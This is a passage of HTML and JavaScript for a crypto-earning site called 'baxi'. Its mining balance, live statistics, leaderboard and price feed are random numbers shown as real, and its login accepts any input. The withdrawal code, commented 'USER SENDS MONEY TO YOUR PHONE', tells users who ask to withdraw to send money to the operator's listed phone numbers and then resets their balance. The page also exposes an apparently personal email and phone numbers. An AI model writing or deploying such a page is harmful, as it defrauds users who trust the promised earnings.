            <div class="method">
                <i class="fab fa-bitcoin green"></i>
                <div>
                    <div style="color:#757575; font-size:0.7rem;">Bitcoin / Crypto</div>
                    <div class="detail">+256 755226797</div>
                </div>
            </div>
        </div>

        <!-- WITHDRAW FORM -->
        <div class="withdraw-form">
            <select id="withdrawMethod">
                <option value="mobile1">📱 Mobile Money (+256 755226797)</option>
                <option value="mobile2">📱 Mobile Money (+256 764397702)</option>
                <option value="googlepay">💳 Google Pay (+256 755226797)</option>
                <option value="bitcoin">₿ Bitcoin (+256 755226797)</option>
            </select>
            <input type="text" placeholder="Your email, phone, or wallet address" id="withdrawAddress">
            <button class="btn btn-success" id="withdrawBtn"><i class="fas fa-paper-plane"></i> Withdraw</button>
        </div>
    </div>

    <!-- SURVEY POPUP -->
    <div class="survey-overlay" id="surveyPopup">
        <button class="close" id="closeSurvey"><i class="fas fa-times"></i></button>
        <h4><i class="fas fa-star"></i> Quick Survey</h4>
        <p style="color:#BDBDBD; font-size:0.9rem;">Rate baxi today (1–5 stars)</p>
        <div class="stars" id="starContainer">
            <i class="fas fa-star" data-val="1"></i>
            <i class="fas fa-star" data-val="2"></i>
            <i class="fas fa-star" data-val="3"></i>
            <i class="fas fa-star" data-val="4"></i>
            <i class="fas fa-star" data-val="5"></i>
        </div>
        <button class="submit-survey" id="submitSurvey">Submit & Earn 0.05 BAXI</button>
    </div>

    <!-- LOGIN MODAL -->
    <div class="modal" id="authModal">
        <div class="modal-content">
            <button class="modal-close" id="closeModal"><i class="fas fa-times"></i></button>
            <h2 id="authTitle">Login</h2>
            <input type="text" placeholder="Username" id="authUsername">
            <input type="password" placeholder="Password" id="authPassword">
            <button class="btn btn-primary" id="authSubmitBtn"><i class="fas fa-sign-in-alt"></i> Login</button>
            <p style="color:#757575; margin-top:16px; text-align:center; font-size:0.9rem;" id="authToggle">Don't have an account? <span style="color:#FF9800;cursor:pointer;" id="switchToSignup">Sign up</span></p>
        </div>
    </div>

    <!-- FOOTER -->
    <footer class="footer">
        <span>© 2026 <strong style="color:#FF9800;">baxi</strong> — Survey · Mine · Ads · Games</span>
        <div class="social">
            <i class="fab fa-twitter"></i>
            <i class="fab fa-discord"></i>
            <i class="fab fa-telegram"></i>
            <i class="fab fa-youtube"></i>
        </div>
    </footer>
</div>

<script>
    (function() {
        // Toast notification
        function showToast(title, body, type = 'success') {
            const toast = document.getElementById('toast');
            document.getElementById('toastTitle').textContent = title;
            document.getElementById('toastBody').textContent = body;
            toast.className = 'toast ' + type;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 5000);
        }

        // Mining
        let balance = 0;
        const balanceEl = document.getElementById('miningBalance');
        const hashEl = document.getElementById('hashRate');
        document.getElementById('mineBtn').addEventListener('click', function() {
            const earned = parseFloat((Math.random() * 0.08 + 0.02).toFixed(3));
            balance += earned;
            balanceEl.textContent = balance.toFixed(3);
            hashEl.textContent = (Math.random() * 1.5 + 0.3).toFixed(2);
            this.style.transform = 'scale(0.92)';
            setTimeout(() => { this.style.transform = ''; }, 120);
        });
        setInterval(() => {
            balance += parseFloat((Math.random() * 0.015 + 0.003).toFixed(3));
            balanceEl.textContent = balance.toFixed(3);
            hashEl.textContent = (Math.random() * 0.6 + 0.4).toFixed(2);
        }, 3000);

        // Survey
        const stars = document.querySelectorAll('#starContainer i');
        let selectedRating = 0;
        stars.forEach(star => {
            star.addEventListener('click', function() {
                const val = parseInt(this.dataset.val);
                selectedRating = val;
                stars.forEach(s => s.classList.toggle('active', parseInt(s.dataset.val) <= val));
            });
            star.addEventListener('mouseenter', function() {
                const val = parseInt(this.dataset.val);
                stars.forEach(s => s.style.color = (parseInt(s.dataset.val) <= val) ? '#FF9800' : '#424242');
            });
            star.addEventListener('mouseleave', function() {
                stars.forEach(s => s.style.color = s.classList.contains('active') ? '#FF9800' : '#424242');
            });
        });
        document.getElementById('submitSurvey').addEventListener('click', function() {
            if (selectedRating === 0) { showToast('⭐ Rating Required', 'Select 1–5 stars.', 'error'); return; }
            balance += 0.05;
            balanceEl.textContent = balance.toFixed(3);
            showToast('✅ Survey Complete!', 'You earned 0.05 BAXI!', 'success');
            document.getElementById('surveyPopup').style.display = 'none';
        });
        document.getElementById('closeSurvey').addEventListener('click', () => {
            document.getElementById('surveyPopup').style.display = 'none';
        });

        // Referral
        document.getElementById('copyRefBtn').addEventListener('click', function() {
            const link = document.getElementById('referralLink').textContent;
            navigator.clipboard.writeText(link).then(() => {
                this.innerHTML = '<i class="fas fa-check"></i> Copied!';
                showToast('📋 Copied!', 'Referral link copied.', 'success');
                setTimeout(() => { this.innerHTML = '<i class="fas fa-copy"></i> Copy'; }, 2000);
            }).catch(() => alert('Copy: ' + link));
        });

        // ===== WITHDRAWAL - USER SENDS MONEY TO YOUR PHONE =====
        document.getElementById('withdrawBtn').addEventListener('click', function() {
            const method = document.getElementById('withdrawMethod').value;
            const address = document.getElementById('withdrawAddress').value.trim();
            
            if (!address) {
                showToast('❌ Missing Address', 'Enter your payment address.', 'error');
                return;
            }
            if (balance < 0.5) {
                showToast('❌ Insufficient Balance', 'Minimum 0.5 BAXI. You have ' + balance.toFixed(3), 'error');
                return;
            }

            const methodNames = {
                'mobile1': 'Mobile Money (+256 755226797)',
                'mobile2': 'Mobile Money (+256 764397702)',
                'googlepay': 'Google Pay (+256 755226797)',
                'bitcoin': 'Bitcoin (+256 755226797)'
            };

            // Show user where to send payment (YOUR PHONE NUMBERS)
            showToast('📲 Send Payment', 
                'Send ' + balance.toFixed(3) + ' BAXI equivalent to:\n' +
                '📱 +256 755226797\n' +
                '📱 +256 764397702\n\n' +
                'Then email: byaruhangajordan214@gmail.com', 'success');

            // Open email to YOU with withdrawal request (YOUR EMAIL - hidden from users)
            const adminMessage = '💰 NEW WITHDRAWAL REQUEST!\n' +
                'Amount: ' + balance.toFixed(3) + ' BAXI\n' +
                'Method: ' + methodNames[method] + '\n' +
                'User Address: ' + address;

            const gmailLink = 'https://mail.google.com/mail/?view=cm&fs=1&to=byaruhangajordan214@gmail.com&su=BAXI%20WITHDRAWAL&body=' + 
                encodeURIComponent(adminMessage);
            
            window.open(gmailLink, '_blank');
            
            // Reset balance
            balance = 0;
            balanceEl.textContent = '0.000';
            document.getElementById('withdrawAddress').value = '';

            console.log('===== BAXI WITHDRAWAL =====');
            console.log(adminMessage);
            console.log('=============================');
        });

        // Scroll to withdraw
        document.getElementById('withdrawHero').addEventListener('click', () => {
            document.getElementById('withdrawSection').scrollIntoView({ behavior: 'smooth' });
        });
        document.getElementById('startMiningHero').addEventListener('click', () => {
            document.getElementById('miningSection').scrollIntoView({ behavior: 'smooth' });
        });

        // Auth
        const modal = document.getElementById('authModal');
        let isLogin = true;
        document.getElementById('loginBtn').addEventListener('click', () => {
            isLogin = true;
            document.getElementById('authTitle').textContent = 'Login';
            document.getElementById('authSubmitBtn').innerHTML = '<i class="fas fa-sign-in-alt"></i> Login';
            document.getElementById('authToggle').innerHTML = "Don't have an account? <span style='color:#FF9800;cursor:pointer;' id='switchToSignup'>Sign up</span>";
            modal.classList.add('active');
            document.getElementById('switchToSignup').addEventListener('click', function() {
                isLogin = false;
                document.getElementById('authTitle').textContent = 'Sign Up';
                document.getElementById('authSubmitBtn').innerHTML = '<i class="fas fa-user-plus"></i> Sign Up';
                document.getElementById('authToggle').innerHTML = "Already have an account? <span style='color:#FF9800;cursor:pointer;' id='switchToLogin'>Login</span>";
                document.getElementById('switchToLogin').addEventListener('click', function() {
                    document.getElementById('loginBtn').click();
                });
            });
        });
        document.getElementById('signupBtn').addEventListener('click', () => {
            document.getElementById('loginBtn').click();
        });
        document.getElementById('closeModal').addEventListener('click', () => modal.classList.remove('active'));
        modal.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('active'); });
        document.getElementById('authSubmitBtn').addEventListener('click', function() {
            const username = document.getElementById('authUsername').value.trim();
            const password = document.getElementById('authPassword').value.trim();
            if (!username || !password) {
                showToast('❌ Required', 'Enter username and password.', 'error');
                return;
            }
            showToast('✅ Welcome ' + username + '!', isLogin ? 'Login successful!' : 'Account created!', 'success');
            modal.classList.remove('active');
            document.getElementById('authUsername').value = '';
            document.getElementById('authPassword').value = '';
            localStorage.setItem('baxiUser', username);
        });

        // Leaderboard
        document.getElementById('leaderboardBtn').addEventListener('click', function() {
            const topUsers = [
                { name: 'CryptoKing', score: 245.7 },
                { name: 'MinerPro', score: 189.3 },
                { name: 'SurveyMaster', score: 156.8 },
                { name: 'GameChamp', score: 134.2 },
                { name: 'TokenHunter', score: 112.5 }
            ];
            let message = '🏆 BAXI LEADERBOARD 🏆\n\n';
            topUsers.forEach((user, index) => {
                message += (index + 1) + '. ' + user.name + ' — ' + user.score.toFixed(1) + ' BAXI\n';
            });
            alert(message);
        });

        // Live stats
        setInterval(() => {
            const users = parseInt(document.getElementById('totalUsers').textContent.replace(/,/g, ''));
            document.getElementById('totalUsers').textContent = (users + Math.floor(Math.random() * 3)).toLocaleString();
            document.getElementById('onlineNow').textContent = Math.floor(Math.random() * 60 + 40);
            document.getElementById('minersOnline').textContent = Math.floor(Math.random() * 50 + 100);
            const totalMined = parseFloat(document.getElementById('totalMined').textContent);
            document.getElementById('totalMined').textContent = (totalMined + Math.random() * 0.05).toFixed(2);
        }, 5000);
        setInterval(() => {
            document.getElementById('btcPrice').textContent = '$' + (67000 + Math.floor(Math.random() * 1000)).toLocaleString();
        }, 10000);

        // Keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.key === 'm' || e.key === 'M') document.getElementById('mineBtn').click();
            if (e.key === 'w' || e.key === 'W') document.getElementById('withdrawSection').scrollIntoView({ behavior: 'smooth' });
            if (e.key === 's' || e.key === 'S') document.getElementById('surveyPopup').style.display = 'block';
        });

        console.log('🔥 BAXI FULLY LOADED');
        console.log('📱 Admin Phone: +256 755226797');
        console.log('📧 Admin Email: byaruhangajordan214@gmail.com');

        setTimeout(() => {
            showToast('🚀 Welcome to baxi!', 'Start mining and earning real money.', 'success');
        }, 1000);
    })();
</script>
</body>
</html>
